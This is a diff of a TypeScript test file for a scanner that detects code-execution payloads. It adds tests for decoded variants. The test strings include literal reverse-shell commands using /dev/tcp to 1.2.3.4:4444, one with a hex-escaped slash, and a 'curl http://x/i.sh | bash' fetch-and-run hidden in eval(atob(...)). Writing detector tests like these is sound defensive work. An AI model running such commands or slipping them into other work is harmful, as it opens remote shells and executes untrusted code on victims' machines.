@@ -2,6 +2,7 @@ import { describe, it } from 'node:test';
 import assert from 'node:assert/strict';
 import { detectCodeExec } from '../src/scanner/codeexec.js';
 
+
 describe('detectCodeExec — raw patterns', () => {
   const has = (text: string, category: string, label?: string) =>
     detectCodeExec(text).some(m => m.category === category && (!label || m.label === label));
@@ -45,5 +46,18 @@ describe('detectCodeExec — raw patterns', () => {
   it('reverse_shell patterns carry tier weapon', () => {
     assert.ok(detectCodeExec('cat /dev/tcp/1.2.3.4/4444').every(m =>
       m.category !== 'reverse_shell' || m.tier === 'weapon'));
+  });
+});
+
+describe('detectCodeExec — decoded variants', () => {
+  it('flags a hex-escaped /dev/tcp payload', () => {
+    // "/dev/tcp/1.2.3.4/4444" with the leading slash hex-escaped
+    const text = 'bash -i >& \\x2fdev/tcp/1.2.3.4/4444 0>&1';
+    assert.ok(detectCodeExec(text).some(m => m.category === 'reverse_shell'));
+  });
+  it('flags curl|bash hidden in a base64 blob (eval(atob(...)))', () => {
+    const inner = Buffer.from('curl http://x/i.sh | bash').toString('base64');
+    const text = `eval(atob('${inner}'))`;
+    assert.ok(detectCodeExec(text).some(m => m.category === 'download_and_execute'));
   });
 });
